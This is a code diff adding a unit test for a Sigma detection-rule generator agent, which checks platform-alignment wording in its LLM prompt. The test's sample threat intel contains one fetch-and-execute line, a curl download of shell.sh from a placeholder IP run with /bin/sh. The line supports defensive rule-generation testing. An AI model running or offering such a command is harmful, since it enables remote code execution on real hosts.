@@ -1452,3 +1452,23 @@ def test_cloud_control_plane_rules_generates_identity_and_cloud_audit():
     cloud_doc = yaml.safe_load(cloud_rule.rule_yaml)
     assert cloud_doc["detection"]["selection"]["eventSource"] == "sts.amazonaws.com"
     assert cloud_doc["logsource"] == {"category": "cloud_audit"}
+
+
+def test_platform_preservation_and_strict_alignment_prompt():
+    agent = SigmaGeneratorAgent()
+    input_windows = SigmaGenerationInput(
+        hypothesis="Windows APT29 hunt",
+        threat_intel="Adversary downloaded payload via curl http://1.2.3.4/shell.sh and executed /bin/sh",
+        platforms=["Windows"],
+        techniques=["T1059.003"],
+    )
+    prompt = agent._build_prompt(input_windows, "process_creation")
+    assert "STRICT PLATFORM ALIGNMENT" in prompt
+    assert "PLATFORMS: Windows" in prompt
+    assert "If PLATFORMS is strictly Windows, you MUST NOT emit Linux/Unix paths" in prompt
+
+    # Verify execute does not append linux when platforms is explicitly Windows
+    # (even though threat_intel contains /bin/sh)
+    # LLM is disabled, so it returns failure, but we check logsources/platforms behavior
+    res = agent.execute(input_windows)
+    assert not res.success  # No LLM configured
